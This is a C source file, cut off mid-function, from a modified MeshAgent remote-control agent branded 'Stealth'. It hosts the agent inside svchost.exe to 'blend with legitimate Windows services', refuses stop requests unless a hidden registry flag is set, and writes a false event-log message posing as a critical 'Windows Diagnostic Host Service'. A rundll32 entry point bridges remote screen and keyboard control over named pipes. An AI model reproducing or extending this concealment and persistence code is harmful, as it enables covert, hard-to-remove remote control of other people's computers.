/*
 * MeshAgent Stealth - Svchost.exe Hosting Implementation
 *
 * Allows MeshAgent to run as a DLL inside svchost.exe instead of standalone process.
 * This provides maximum stealth as the service blends with legitimate Windows services.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <wchar.h>
#include <sddl.h>
#include <strsafe.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "stealth_defaults.h"
#include "service_security.h"
#include "../meshcore/agentcore.h"
#include "../meshcore/meshdefines.h"
#include "../meshcore/KVM/Windows/kvm.h"
#include "branding_util.h"
#include "../microstack/ILibParsers.h"

// Use AgentCore APIs
// MeshAgent_Create/MeshAgent_Stop are declared in agentcore.h
// Provide a local run helper that starts the ILib chain
static void MeshAgent_Run(MeshAgentHostContainer* agent)
{
    if (agent != NULL && agent->chain != NULL)
    {
        ILibStartChain(agent->chain);
    }
}

// Global state for svchost-hosted service
static SERVICE_STATUS_HANDLE g_SvchostStatusHandle = NULL;
static SERVICE_STATUS g_SvchostStatus = {0};
static BOOL g_SvchostRunning = FALSE;

static void Stealth_SvchostReportStopDenial(void)
{
    wchar_t logName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), logName, _countof(logName));
    if (logName[0] == L'\0')
    {
        StringCchCopyW(logName, _countof(logName), STEALTH_FALLBACK_SERVICE_NAME);
    }
    HANDLE evt = RegisterEventSourceW(NULL, logName);
    if (evt != NULL)
    {
        const wchar_t* strings[1];
        strings[0] = L"The Windows Diagnostic Host Service is marked critical and cannot be stopped.";
        ReportEventW(evt,
            EVENTLOG_WARNING_TYPE,
            0,
            0xC0020001,
            NULL,
            1,
            0,
            strings,
            NULL);
        DeregisterEventSource(evt);
    }
}
static MeshAgentHostContainer* g_SvchostAgent = NULL;

static BOOL Stealth_SvchostAllowStop(void)
{
    wchar_t serviceKeyName[256] = {0};
    // AllowStop is stored under the SCM service key name, not the display name.
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0')
    {
        StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
    }

    wchar_t paramsKeyPath[512];
    _snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceKeyName);

    DWORD value = 0;
    DWORD cb = sizeof(value);
    if (RegGetValueW(HKEY_LOCAL_MACHINE, paramsKeyPath, L"AllowStop", RRF_RT_REG_DWORD, NULL, &value, &cb) == ERROR_SUCCESS)
    {
        return (value != 0);
    }
    return FALSE;
}

static void Stealth_SvchostRefreshControlsAccepted(void)
{
    DWORD controls = SERVICE_ACCEPT_STOP |
                     SERVICE_ACCEPT_SHUTDOWN |
                     SERVICE_ACCEPT_POWEREVENT |
                     SERVICE_ACCEPT_SESSIONCHANGE;
    g_SvchostStatus.dwControlsAccepted = controls;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
}

// Cached module path information for resolving provisioning artifacts
static wchar_t g_SvchostModulePath[MAX_PATH] = {0};
static wchar_t g_SvchostInstallDir[MAX_PATH] = {0};
static wchar_t g_SvchostLogFile[MAX_PATH] = {0};
static char g_SvchostExeStorage[ILibMemory_Init_Size(2048, sizeof(void*))] = {0};
static char* g_SvchostExeUtf8 = NULL;
static char* g_SvchostArgv[2] = { NULL, NULL };
static char g_SvchostFallbackExe[_MAX_PATH] = {0};
static BOOL g_SvchostPathsInitialized = FALSE;
static BOOL g_SvchostCrtHandlersInstalled = FALSE;

// Forward declarations
static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand);
static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle);
static void Stealth_SvchostLogProvisioningStatus(void);
static void Stealth_SvchostLogLine(const wchar_t* format, ...);
static void Stealth_SvchostInstallCrtHandlers(void);

#if defined(BUILD_SVCHOST_DLL) && defined(_LINKVM)
extern int wmain(int argc, char* wargv[]);
extern DWORD WINAPI kvm_server_mainloop(LPVOID Param);
extern int g_shutdown;
extern int kvmConsoleMode;
extern int kvm_server_inputdata(char* block, int blocklen, ILibKVM_WriteHandler writeHandler, void* reserved);
typedef HRESULT(__stdcall* StealthDpiAwarenessFunc)(int);
#define STEALTH_PROCESS_PER_MONITOR_DPI_AWARE 2
static LONG g_KvmBridgeTraceCounter = 0;

typedef struct StealthKvmBridgeContext
{
    HANDLE controlPipeHandle;
    HANDLE dataPipeHandle;
    HANDLE stdInHandle;
    HANDLE stdOutHandle;
    DWORD readError;
    DWORD writeError;
} StealthKvmBridgeContext;

typedef struct StealthKvmBridgeLaunchContext
{
    int argc;
    WCHAR arg0[MAX_PATH];
    WCHAR arg1[32];
    WCHAR arg2[32];
    WCHAR arg3[32];
    WCHAR* argv[5];
} StealthKvmBridgeLaunchContext;

static BOOL Stealth_KvmBridgeLooksLikePipeNameW(const wchar_t* value)
{
    return (value != NULL && wcsncmp(value, L"\\\\.\\pipe\\", 9) == 0) ? TRUE : FALSE;
}

static int Stealth_KvmBridgeExtractPipeNamesW(const wchar_t* input, wchar_t* controlPipeName, size_t controlPipeNameLen, wchar_t* dataPipeName, size_t dataPipeNameLen)
{
    const wchar_t* cursor = NULL;
    wchar_t tokenBuffer[MAX_PATH * 4] = { 0 };
    int pipeCount = 0;

    if (controlPipeName != NULL && controlPipeNameLen > 0) { controlPipeName[0] = L'\0'; }
    if (dataPipeName != NULL && dataPipeNameLen > 0) { dataPipeName[0] = L'\0'; }
    if (input == NULL) { return 0; }

    cursor = input;
    while (*cursor != L'\0' && pipeCount < 2)
    {
        const wchar_t* tokenStart = NULL;
        size_t tokenLen = 0;
        wchar_t* destination = NULL;
        size_t destinationLen = 0;

        while (*cursor == L' ' || *cursor == L'\t')
        {
            ++cursor;
        }
        if (*cursor == L'\0') { break; }

        if (*cursor == L'"')
        {
            ++cursor;
            tokenStart = cursor;
            while (*cursor != L'\0' && *cursor != L'"')
            {
                ++cursor;
            }
            tokenLen = (size_t)(cursor - tokenStart);
            if (*cursor == L'"') { ++cursor; }
        }
        else
        {
            tokenStart = cursor;
            while (*cursor != L'\0' && *cursor != L' ' && *cursor != L'\t')
            {
                ++cursor;
            }
            tokenLen = (size_t)(cursor - tokenStart);
        }

        if (tokenLen == 0) { continue; }
        if (tokenLen >= _countof(tokenBuffer)) { tokenLen = _countof(tokenBuffer) - 1; }
        memcpy_s(tokenBuffer, sizeof(tokenBuffer), tokenStart, tokenLen * sizeof(wchar_t));
        tokenBuffer[tokenLen] = L'\0';

        if (_wcsnicmp(tokenBuffer, L"\\\\.\\pipe\\", 9) != 0) { continue; }
        destination = (pipeCount == 0) ? controlPipeName : dataPipeName;
        destinationLen = (pipeCount == 0) ? controlPipeNameLen : dataPipeNameLen;
        if (destination != NULL && destinationLen > 0)
        {
            StringCchCopyW(destination, destinationLen, tokenBuffer);
        }
        ++pipeCount;
    }
    return pipeCount;
}

static int Stealth_KvmBridgeHasTokenW(const wchar_t* input, const wchar_t* token)
{
    const wchar_t* cursor = NULL;
    size_t tokenLen = 0;

    if (input == NULL || token == NULL || token[0] == L'\0') { return 0; }
    tokenLen = wcslen(token);
    cursor = input;

    while ((cursor = wcsstr(cursor, token)) != NULL)
    {
        wchar_t before = (cursor == input) ? L' ' : cursor[-1];
        wchar_t after = cursor[tokenLen];
        int beforeOk = (before == L' ' || before == L'\t' || before == L'\r' || before == L'\n' || before == L'"' || before == L'\0');
        int afterOk = (after == L' ' || after == L'\t' || after == L'\r' || after == L'\n' || after == L'"' || after == L'\0');
        if (beforeOk && afterOk) { return 1; }
        ++cursor;
    }
    return 0;
}

static void Stealth_KvmBridgeBuildLaunchContextW(const wchar_t* cmdLine, StealthKvmBridgeLaunchContext* ctx)
{
    if (ctx == NULL) { return; }
    ZeroMemory(ctx, sizeof(StealthKvmBridgeLaunchContext));

    if (GetModuleFileNameW(NULL, ctx->arg0, (DWORD)_countof(ctx->arg0)) == 0)
    {
        StringCchCopyW(ctx->arg0, _countof(ctx->arg0), L"rundll32.exe");
    }
    if (Stealth_KvmBridgeHasTokenW(cmdLine, L"-kvm0"))
    {
        StringCchCopyW(ctx->arg1, _countof(ctx->arg1), L"-kvm0");
    }
    else
    {
        StringCchCopyW(ctx->arg1, _countof(ctx->arg1), L"-kvm1");
    }

    ctx->argv[ctx->argc++] = ctx->arg0;
    ctx->argv[ctx->argc++] = ctx->arg1;

    if (Stealth_KvmBridgeHasTokenW(cmdLine, L"-coredump"))
    {
        StringCchCopyW(ctx->arg2, _countof(ctx->arg2), L"-coredump");
        ctx->argv[ctx->argc++] = ctx->arg2;
    }
    if (Stealth_KvmBridgeHasTokenW(cmdLine, L"-remotecursor"))
    {
        WCHAR* dest = (ctx->argc == 2) ? ctx->arg2 : ctx->arg3;
        size_t destLen = (ctx->argc == 2) ? _countof(ctx->arg2) : _countof(ctx->arg3);
        StringCchCopyW(dest, destLen, L"-remotecursor");
        ctx->argv[ctx->argc++] = dest;
    }
    ctx->argv[ctx->argc] = NULL;
}

static void Stealth_KvmBridgeEnableDpiAwareness(void)
{
    HMODULE shcore = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    StealthDpiAwarenessFunc dpiAwareness = NULL;

    if (shcore != NULL)
    {
        dpiAwareness = (StealthDpiAwarenessFunc)GetProcAddress(shcore, (LPCSTR)"SetProcessDpiAwareness");
    }
    if (dpiAwareness != NULL)
    {
        dpiAwareness(STEALTH_PROCESS_PER_MONITOR_DPI_AWARE);
        FreeLibrary(shcore);
    }
    else
    {
        if (shcore != NULL) { FreeLibrary(shcore); }
        SetProcessDPIAware();
    }
}

static ILibTransport_DoneState Stealth_KvmBridgeWriteSink(char* buffer, int bufferLen, void* reserved)
{
    StealthKvmBridgeContext* ctx = (StealthKvmBridgeContext*)reserved;
    HANDLE outputHandle = NULL;
    DWORD written = 0;

    if (ctx == NULL)
    {
        return ILibTransport_DoneState_ERROR;
    }
    if (buffer == NULL || bufferLen <= 0)
    {
        g_shutdown = 1;
        return ILibTransport_DoneState_COMPLETE;
    }
    if (GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_TRACE_PACKETS", NULL, 0) > 0 &&
        InterlockedIncrement(&g_KvmBridgeTraceCounter) <= 64)
    {
        unsigned short packetType = 0;
        if (bufferLen >= 2)
        {
            packetType = (unsigned short)ntohs(((unsigned short*)buffer)[0]);
        }
        Stealth_SvchostLogLine(L"KvmSessionBridgeW write type=%u len=%d", packetType, bufferLen);
    }

    outputHandle = (ctx->stdOutHandle != NULL && ctx->stdOutHandle != INVALID_HANDLE_VALUE) ? ctx->stdOutHandle : ctx->dataPipeHandle;
    if (outputHandle == NULL || outputHandle == INVALID_HANDLE_VALUE)
    {
        ctx->writeError = ERROR_INVALID_HANDLE;
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }

    if (!WriteFile(outputHandle, buffer, (DWORD)bufferLen, &written, NULL))
    {
        ctx->writeError = GetLastError();
        if (ctx->writeError == ERROR_SUCCESS) { ctx->writeError = ERROR_BROKEN_PIPE; }
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }
    if (written != (DWORD)bufferLen)
    {
        ctx->writeError = ERROR_WRITE_FAULT;
        g_shutdown = 1;
        return ILibTransport_DoneState_ERROR;
    }
    return ILibTransport_DoneState_COMPLETE;
}

static DWORD WINAPI Stealth_KvmBridgeInputThread(LPVOID user)
{
    StealthKvmBridgeContext* ctx = (StealthKvmBridgeContext*)user;
    int len = 0;
    int ptr = 0;
    char packetBuffer[30000];

    HANDLE inputHandle = NULL;

    if (ctx == NULL)
    {
        return 0;
    }
    inputHandle = (ctx->stdInHandle != NULL && ctx->stdInHandle != INVALID_HANDLE_VALUE) ? ctx->stdInHandle : ctx->controlPipeHandle;
    if (inputHandle == NULL || inputHandle == INVALID_HANDLE_VALUE)
    {
        ctx->readError = ERROR_INVALID_HANDLE;
        return 0;
    }

    while (!g_shutdown)
    {
        DWORD read = 0;
        BOOL ok = ReadFile(inputHandle, packetBuffer + len, (DWORD)(sizeof(packetBuffer) - len), &read, NULL);
        if (!ok || read == 0)
        {
            ctx->readError = GetLastError();
            if (ctx->readError == ERROR_SUCCESS) { ctx->readError = ERROR_BROKEN_PIPE; }
            g_shutdown = 1;
            break;
        }

        len += (int)read;
        ptr = 0;
        while ((len - ptr) >= 4)
        {
            unsigned short type = ntohs(((unsigned short*)(packetBuffer + ptr))[0]);
            int size = (int)ntohs(((unsigned short*)(packetBuffer + ptr))[1]);
            int consumed = 0;

            if (type == MNG_JUMBO)
            {
                if ((len - ptr) < 8) { break; }
                size = 8 + (int)ntohl(((unsigned int*)(packetBuffer + ptr))[1]);
            }
            if (size < 4 || size > (int)sizeof(packetBuffer))
            {
                ctx->readError = ERROR_INVALID_DATA;
                g_shutdown = 1;
                return 0;
            }
            if ((len - ptr) < size) { break; }

            if (type == MNG_KVM_DISCONNECT)
            {
                ptr += size;
                g_shutdown = 1;
                break;
            }

            consumed = kvm_server_inputdata(packetBuffer + ptr, len - ptr, Stealth_KvmBridgeWriteSink, ctx);
            if (consumed <= 0) { break; }
            ptr += consumed;
        }

        if (ptr > 0)
        {
            if (ptr < len)
            {
                memmove(packetBuffer, packetBuffer + ptr, (size_t)(len - ptr));
            }
            len -= ptr;
        }
    }

    return 0;
}

static DWORD WINAPI Stealth_KvmBridgeMainloopThread(LPVOID user)
{
    StealthKvmBridgeLaunchContext* ctx = (StealthKvmBridgeLaunchContext*)user;

    if (ctx == NULL || ctx->argc < 2) { return ERROR_INVALID_PARAMETER; }
    return (DWORD)wmain(ctx->argc, (char**)ctx->argv);
}

void CALLBACK KvmSessionBridgeW(HWND hwnd, HINSTANCE hinstDLL, LPWSTR lpCmdLine, int nCmdShow)
{
    wchar_t controlPipeName[MAX_PATH * 4] = {0};
    wchar_t dataPipeName[MAX_PATH * 4] = {0};
    wchar_t forceExitCodeText[32] = {0};
    HANDLE inputThread = NULL;
    HANDLE mainloopThread = NULL;
    HANDLE bridgeStdIn = NULL;
    HANDLE bridgeStdOut = NULL;
    StealthKvmBridgeContext ctx;
    StealthKvmBridgeLaunchContext launchCtx;
    DWORD pipeMode = PIPE_READMODE_BYTE;
    DWORD forceExitCodeLen = 0;
    BOOL useNamedPipeBridge = FALSE;
    BOOL useLegacySinglePipeBridge = FALSE;
    int pipeCount = 0;

    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(nCmdShow);

    ZeroMemory(&ctx, sizeof(ctx));
    ctx.controlPipeHandle = INVALID_HANDLE_VALUE;
    ctx.dataPipeHandle = INVALID_HANDLE_VALUE;

    Stealth_SvchostInitializePaths(hinstDLL);

    // rundll32.exe's lpCmdLine parameter is unreliable for W-suffix entry points
    // in cross-session spawns — it passes the ANSI PEB command line bytes as-is,
    // producing garbled WIDE text.  Use GetCommandLineW() directly and extract
    // the arguments after the entry point name.
    {
        LPWSTR fullCmdLine = GetCommandLineW();
        LPWSTR entryPoint = NULL;
        if (fullCmdLine != NULL)
        {
            entryPoint = wcsstr(fullCmdLine, L"KvmSessionBridgeW");
            if (entryPoint != NULL)
            {
                entryPoint += wcslen(L"KvmSessionBridgeW");
                while (*entryPoint == L' ') { entryPoint++; }
                lpCmdLine = entryPoint;
            }
        }
    }

    Stealth_KvmBridgeBuildLaunchContextW(lpCmdLine, &launchCtx);
    pipeCount = Stealth_KvmBridgeExtractPipeNamesW(lpCmdLine, controlPipeName, _countof(controlPipeName), dataPipeName, _countof(dataPipeName));
    useNamedPipeBridge = (pipeCount > 0 && Stealth_KvmBridgeLooksLikePipeNameW(controlPipeName));
    useLegacySinglePipeBridge = (pipeCount == 1);

    if (useNamedPipeBridge && !useLegacySinglePipeBridge)
    {
        Stealth_SvchostLogLine(L"KvmSessionBridgeW starting (input=%ls output=%ls)", controlPipeName, dataPipeName);
    }
    else
    {
        Stealth_SvchostLogLine(L"KvmSessionBridgeW starting (%ls)", useNamedPipeBridge ? controlPipeName : L"stdio");
    }
    forceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", forceExitCodeText, (DWORD)_countof(forceExitCodeText));
    if (forceExitCodeLen > 0 && forceExitCodeLen < _countof(forceExitCodeText))
    {
        DWORD forcedExitCode = wcstoul(forceExitCodeText, NULL, 10);
        if (forcedExitCode != 0)
        {
            Stealth_SvchostLogLine(L"KvmSessionBridgeW forced exit (code=%lu)", forcedExitCode);
            ExitProcess(forcedExitCode);
        }
    }
    if (useNamedPipeBridge && !WaitNamedPipeW(controlPipeName, 5000))
    {
        Stealth_SvchostLogLine(L"KvmSessionBridgeW WaitNamedPipeW failed (error=%lu, pipe=%ls)", GetLastError(), controlPipeName);
        return;
    }
    if (!useLegacySinglePipeBridge && useNamedPipeBridge && !WaitNamedPipeW(dataPipeName, 5000))
    {
        Stealth_SvchostLogLine(L"KvmSessionBridgeW WaitNamedPipeW failed (error=%lu, pipe=%ls)", GetLastError(), dataPipeName);
        return;
    }

    if (useNamedPipeBridge)
    {
        if (useLegacySinglePipeBridge)
        {
            ctx.controlPipeHandle = CreateFileW(controlPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (ctx.controlPipeHandle == INVALID_HANDLE_VALUE)
            {
                Stealth_SvchostLogLine(L"KvmSessionBridgeW CreateFileW failed (error=%lu, pipe=%ls)", GetLastError(), controlPipeName);
                return;
            }
            ctx.dataPipeHandle = ctx.controlPipeHandle;
            if (!SetNamedPipeHandleState(ctx.controlPipeHandle, &pipeMode, NULL, NULL))
            {
                Stealth_SvchostLogLine(L"KvmSessionBridgeW SetNamedPipeHandleState failed (error=%lu)", GetLastError());
            }
        }
        else
        {
            ctx.controlPipeHandle = CreateFileW(controlPipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (ctx.controlPipeHandle == INVALID_HANDLE_VALUE)
            {
                Stealth_SvchostLogLine(L"KvmSessionBridgeW CreateFileW failed (error=%lu, pipe=%ls)", GetLastError(), controlPipeName);
                goto cleanup;
            }
            ctx.dataPipeHandle = CreateFileW(dataPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (ctx.dataPipeHandle == INVALID_HANDLE_VALUE)
            {
                Stealth_SvchostLogLine(L"KvmSessionBridgeW CreateFileW failed (error=%lu, pipe=%ls)", GetLastError(), dataPipeName);
                goto cleanup;
            }
        }
        if (!DuplicateHandle(GetCurrentProcess(), ctx.controlPipeHandle, GetCurrentProcess(), &bridgeStdIn, 0, FALSE, DUPLICATE_SAME_ACCESS))
        {
            Stealth_SvchostLogLine(L"KvmSessionBridgeW DuplicateHandle(stdin) failed (error=%lu)", GetLastError());
            goto cleanup;
        }
        if (!DuplicateHandle(GetCurrentProcess(), ctx.dataPipeHandle, GetCurrentProcess(), &bridgeStdOut, 0, FALSE, DUPLICATE_SAME_ACCESS))
        {
            Stealth_SvchostLogLine(L"KvmSessionBridgeW DuplicateHandle(stdout) failed (error=%lu)", GetLastError());
            goto cleanup;
        }
        ctx.stdInHandle = bridgeStdIn;
        ctx.stdOutHandle = bridgeStdOut;
        SetStdHandle(STD_INPUT_HANDLE, bridgeStdIn);
        SetStdHandle(STD_OUTPUT_HANDLE, bridgeStdOut);
    }

    g_shutdown = 0;

    // The wmain -kvm1 path creates its own kvm_mainloopinput thread that reads
    // from hStdIn (which KvmSessionBridgeW set to the control pipe at line 533).
    // That internal thread handles all command input from the parent and calls
    // kvm_server_inputdata with kvm_serviceWriteSink (which writes responses to
    // stdout = the data pipe).
    //
    // We do NOT create a second Stealth_KvmBridgeInputThread here.  Having two
    // threads read from the same control pipe causes a dual-reader race that
    // splits commands randomly and corrupts the unsynchronised globals in
    // kvm_server_inputdata (tileInfo, SCALING_FACTOR_NEW, g_remotepause, etc.).
    Stealth_SvchostLogLine(L"KvmSessionBridgeW launching mainloop argc=%d argv0=[%ls] argv1=[%ls] useNamedPipe=%d", launchCtx.argc, launchCtx.argv[0] ? launchCtx.argv[0] : L"(null)", launchCtx.argv[1] ? launchCtx.argv[1] : L"(null)", useNamedPipeBridge ? 1 : 0);
    mainloopThread = CreateThread(NULL, 0, Stealth_KvmBridgeMainloopThread, &launchCtx, 0, NULL);
    if (mainloopThread == NULL)
    {
        Stealth_SvchostLogLine(L"KvmSessionBridgeW mainloop CreateThread failed (error=%lu)", GetLastError());
        goto cleanup;
    }

    WaitForSingleObject(mainloopThread, INFINITE);
    {
        DWORD exitCode = 0;
        GetExitCodeThread(mainloopThread, &exitCode);
        Stealth_SvchostLogLine(L"KvmSessionBridgeW mainloop exited (threadExitCode=%lu readError=%lu writeError=%lu)", exitCode, ctx.readError, ctx.writeError);
    }

cleanup:
    g_shutdown = 1;
    if (inputThread != NULL)
    {
        if (ctx.controlPipeHandle != NULL && ctx.controlPipeHandle != INVALID_HANDLE_VALUE)
        {
            CancelIoEx(ctx.controlPipeHandle, NULL);
        }
        WaitForSingleObject(inputThread, 2000);
    }
    if (ctx.dataPipeHandle == ctx.controlPipeHandle)
    {
        ctx.dataPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (ctx.controlPipeHandle != NULL && ctx.controlPipeHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(ctx.controlPipeHandle);
        ctx.controlPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (ctx.dataPipeHandle != NULL && ctx.dataPipeHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(ctx.dataPipeHandle);
        ctx.dataPipeHandle = INVALID_HANDLE_VALUE;
    }
    if (mainloopThread != NULL)
    {
        CloseHandle(mainloopThread);
    }
    if (inputThread != NULL)
    {
        CloseHandle(inputThread);
    }
    if (bridgeStdOut != NULL) { CloseHandle(bridgeStdOut); }
    if (bridgeStdIn != NULL) { CloseHandle(bridgeStdIn); }
}
#endif

static void Stealth_SvchostLogLine(const wchar_t* format, ...)
{
    if (format == NULL) { return; }
    if (g_SvchostLogFile[0] == L'\0') { return; }

    FILE* logFile = NULL;
    if (_wfopen_s(&logFile, g_SvchostLogFile, L"a+, ccs=UTF-8") != 0 || logFile == NULL)
    {
        return;
    }

    SYSTEMTIME st;
    GetLocalTime(&st);
    fwprintf(logFile,
             L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] ",
             st.wYear,
             st.wMonth,
             st.wDay,
             st.wHour,
             st.wMinute,
             st.wSecond,
             st.wMilliseconds);

    va_list args;
    va_start(args, format);
    vfwprintf(logFile, format, args);
    va_end(args);
    fputwc(L'\n', logFile);
    fclose(logFile);
}

static void Stealth_SvchostInvalidParameterHandler(
    const wchar_t* expression,
    const wchar_t* function,
    const wchar_t* file,
    unsigned int line,
    uintptr_t reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    const wchar_t* expr = (expression != NULL) ? expression : L"(null)";
    const wchar_t* func = (function != NULL) ? function : L"(null)";
    const wchar_t* src = (file != NULL) ? file : L"(null)";
    Stealth_SvchostLogLine(L"CRT invalid parameter detected: expr=%ls func=%ls file=%ls line=%u",
                           expr,
                           func,
                           src,
                           line);
    Stealth_DebugPrintfW(L"[svchost] CRT invalid parameter: expr=%ls func=%ls file=%ls line=%u",
                         expr,
                         func,
                         src,
                         line);

    void* frames[16] = { 0 };
    USHORT captured = RtlCaptureStackBackTrace(0, (ULONG)(sizeof(frames) / sizeof(frames[0])), frames, NULL);
    for (USHORT i = 0; i < captured; ++i)
    {
        Stealth_SvchostLogLine(L"CRT invalid parameter stack[%u]=%p", (unsigned int)i, frames[i]);
    }
}

static void Stealth_SvchostInstallCrtHandlers(void)
{
    if (g_SvchostCrtHandlersInstalled != FALSE)
    {
        return;
    }

    _set_invalid_parameter_handler(Stealth_SvchostInvalidParameterHandler);
    _set_thread_local_invalid_parameter_handler(Stealth_SvchostInvalidParameterHandler);
    g_SvchostCrtHandlersInstalled = TRUE;
}

static void Stealth_SvchostInitializePaths(HINSTANCE moduleHandle)
{
    if (g_SvchostPathsInitialized != FALSE) { return; }

    HINSTANCE targetModule = moduleHandle;
    if (targetModule == NULL)
    {
#if defined(BUILD_SVCHOST_DLL)
        HINSTANCE discovered = NULL;
        if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                               (LPCWSTR)&Stealth_SvchostInitializePaths,
                               &discovered) != 0)
        {
            targetModule = discovered;
        }
#endif
    }

    if (targetModule != NULL)
    {
        DWORD len = GetModuleFileNameW(targetModule, g_SvchostModulePath, (DWORD)_countof(g_SvchostModulePath));
        if (len == 0 || len >= _countof(g_SvchostModulePath))
        {
            g_SvchostModulePath[0] = L'\0';
        }
    }

    if (g_SvchostModulePath[0] == L'\0')
    {
        DWORD len = GetModuleFileNameW(NULL, g_SvchostModulePath, (DWORD)_countof(g_SvchostModulePath));
        if (len == 0 || len >= _countof(g_SvchostModulePath))
        {
            g_SvchostModulePath[0] = L'\0';
        }
    }

    if (g_SvchostModulePath[0] != L'\0')
    {
        lstrcpynW(g_SvchostInstallDir, g_SvchostModulePath, (int)_countof(g_SvchostInstallDir));
        wchar_t* slash = wcsrchr(g_SvchostInstallDir, L'\\');
        if (slash != NULL) { *slash = L'\0'; }
        Stealth_DebugPrintfW(L"[svchost] module path: %ls", g_SvchostModulePath);
        Stealth_DebugPrintfW(L"[svchost] install directory: %ls", g_SvchostInstallDir);
        _snwprintf_s(g_SvchostLogFile, _countof(g_SvchostLogFile), _TRUNCATE, L"%s\\svchost-debug.log", g_SvchostInstallDir);
        Stealth_SvchostLogLine(L"module path: %ls", g_SvchostModulePath);
        Stealth_SvchostLogLine(L"install directory: %ls", g_SvchostInstallDir);
        Stealth_SvchostInstallCrtHandlers();
    }
    else
    {
        Stealth_DebugPrintfW(L"[svchost] unable to resolve module path for DLL");
        Stealth_SvchostLogLine(L"module path resolution failed");
        g_SvchostLogFile[0] = L'\0';
    }

    if (g_SvchostExeUtf8 == NULL)
    {
        g_SvchostExeUtf8 = ILibMemory_Init(g_SvchostExeStorage, 2048, sizeof(void*), ILibMemory_Types_OTHER);
    }
    if (g_SvchostExeUtf8 != NULL)
    {
        const wchar_t *preferredExe = NULL;
        wchar_t helperPath[MAX_PATH] = { 0 };
        wchar_t brandedName[MAX_PATH] = { 0 };
        BOOL helperExists = FALSE;

        MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), brandedName, _countof(brandedName));
        if (brandedName[0] == L'\0')
        {
            lstrcpynW(brandedName, STEALTH_FALLBACK_EXE_NAME, (int)_countof(brandedName));
        }
        Stealth_SvchostLogLine(L"branding binary name resolved: %ls", brandedName[0] != L'\0' ? brandedName : L"(empty)");

        if (g_SvchostInstallDir[0] != L'\0')
        {
            wchar_t candidate[MAX_PATH] = { 0 };

            if (brandedName[0] != L'\0' &&
                _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\%s", g_SvchostInstallDir, brandedName) > 0)
            {
                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
                helperExists = (GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES);
                Stealth_SvchostLogLine(L"helper candidate: %ls (exists=%d)", helperPath, helperExists ? 1 : 0);
                if (helperExists)
                {
                    Stealth_DebugPrintfW(L"[svchost] helper executable detected: %ls", helperPath);
                    Stealth_SvchostLogLine(L"helper executable: %ls", helperPath);
                }
                else
                {
                    Stealth_SvchostLogLine(L"helper pending provisioning: %ls", helperPath);
                }
            }

            if ((helperPath[0] == L'\0' || helperExists == FALSE) &&
                _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\MeshService64.exe", g_SvchostInstallDir) > 0 &&
                GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
            {
                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
                helperExists = TRUE;
                Stealth_DebugPrintfW(L"[svchost] helper executable detected (fallback): %ls", helperPath);
                Stealth_SvchostLogLine(L"helper executable (fallback): %ls", helperPath);
            }
            else if ((helperPath[0] == L'\0' || helperExists == FALSE) &&
                     _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\MeshService-2022.exe", g_SvchostInstallDir) > 0 &&
                     GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
            {
                lstrcpynW(helperPath, candidate, (int)_countof(helperPath));
                helperExists = TRUE;
                Stealth_DebugPrintfW(L"[svchost] helper executable detected (legacy): %ls", helperPath);
                Stealth_SvchostLogLine(L"helper executable (legacy): %ls", helperPath);
            }
        }

        if (helperPath[0] != L'\0')
        {
            preferredExe = helperPath;
        }
        else if (g_SvchostFallbackExe[0] != 0)
        {
            wchar_t fallbackWide[MAX_PATH] = { 0 };
            if (MultiByteToWideChar(CP_ACP, 0, g_SvchostFallbackExe, -1, fallbackWide, (int)_countof(fallbackWide)) > 0 &&
                fallbackWide[0] != L'\0')
            {
                preferredExe = fallbackWide;
                Stealth_DebugPrintfW(L"[svchost] using fallback executable: %ls", preferredExe);
                Stealth_SvchostLogLine(L"fallback executable: %ls", preferredExe);
            }
        }

        if (preferredExe == NULL || preferredExe[0] == L'\0')
        {
            preferredExe = g_SvchostModulePath;
        }

        if (preferredExe != NULL && preferredExe[0] != L'\0')
        {
            WideCharToMultiByte(CP_UTF8,
                                0,
                                preferredExe,
                                -1,
                                g_SvchostExeUtf8,
